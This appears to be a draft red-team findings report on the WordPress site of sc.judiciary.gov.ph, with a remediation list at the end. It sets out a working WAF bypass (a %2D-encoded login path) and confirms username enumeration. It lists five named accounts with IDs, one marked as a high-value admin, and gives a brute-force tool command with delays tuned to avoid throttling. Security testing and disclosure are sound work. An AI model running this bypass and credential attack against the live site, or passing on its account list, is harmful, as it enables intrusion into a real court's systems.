# Findings draft — sc.judiciary.gov.ph (authorized red team)

**Date:** 2026-05-28  
**Tooling:** `tools/wordpress-bruter/` (curl-backed; Python `requests` blocked by CloudFront TLS fingerprinting)

## 1. CloudFront WAF bypass — CONFIRMED

| Request | HTTP | Notes |
|---------|------|-------|
| `GET /wp-login.php` | **403** | WAF literal match on `wp-login.php` |
| `GET /wp%2Dlogin.php` | **200** | ~33 KB login page — "Supreme Court of the Philippines — WordPress" |

**Root cause:** Rule matches undecoded URL string; origin decodes `%2D` → `-`.

## 2. User enumeration — CONFIRMED (manual + tooling)

With cookie-aware `POST` to `/wp%2Dlogin.php`:

| Username | Probe password | Response |
|----------|----------------|----------|
| `scweb` | wrong | **Error: Invalid Password.** (user exists) |

Prior REST API discovery (`/wp-json/wp/v2/users`) — users to validate in report:

- `scweb` (ID 1) — likely administrator  
- `pio_tyke` (ID 2)  
- `pio_jerome` (ID 16)  
- `tyke-test-admin` (ID 204) — high value  
- `pio_rus` (ID 205)  

Run full enumeration from jump host (≥3s between attempts to avoid CloudFront POST throttling):

```bash
python3 wp_bruter.py -u https://sc.judiciary.gov.ph --bypass hyphen \
  --enumerate-only --users wordlists/sc-judiciary-users.txt --delay 3
```

## 3. No brute-force protection — CONFIRMED

Ten consecutive `POST` attempts to `/wp%2Dlogin.php` returned **HTTP 200** with no CAPTCHA, lockout, or 429 (until CloudFront edge throttling after heavier automation).

## 4. Password reset — verify manually

`GET /wp%2Dlogin.php?action=lostpassword` — test real vs fake usernames per RoE.

## Severity

**Critical** — Primary control (hide wp-login via WAF) is ineffective; no meaningful secondary controls observed.

## Remediation (for final client report)

1. Normalize/decode URLs before WAF evaluation.  
2. Enforce rate limiting / lockout on origin for `wp-login.php`.  
3. Restrict `wp-login` by IP/VPN; require 2FA for administrators.  
4. Remove or harden `tyke-test-admin`; disable public user listing in REST API.  
5. Block encoded-path variants in WAF and at Apache (`mod_rewrite` canonicalization).
